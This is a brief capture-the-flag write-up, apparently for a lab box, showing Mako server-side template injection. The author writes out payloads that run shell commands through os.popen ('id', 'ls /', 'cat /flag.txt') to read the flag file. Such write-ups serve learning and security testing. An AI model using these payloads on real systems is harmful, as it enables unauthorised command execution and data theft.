Pwning Documentary.

	1. Spawned the machine and downloaded the files.



	2. After inspecting the files I discovered that it’s a flutter website using mako. And opened the web browser and looked up the the box's Ip address.


	
	3. In the web I used "${7*7}" to see if it returned a result. It returned 49. the payload I used is "${self.template.module.cache.util.os.popen("id").read()}" and it returned some results.



	4. I altered the the payload a bit to by replacing "id" with "ls /"  "${self.template.module.cache.util.os.popen("ls /").read()}"



	5. I noticed that that there was a "flag.txt" so I altered the payload again from "ls /" to "cat /flag.txt" ."${self.template.module.cache.util.os.popen("cat /flag.txt").read()}" revealed the flag.



![image](https://github.com/user-attachments/assets/faa8e866-1c8f-43fd-aeae-3342545b8e7f)

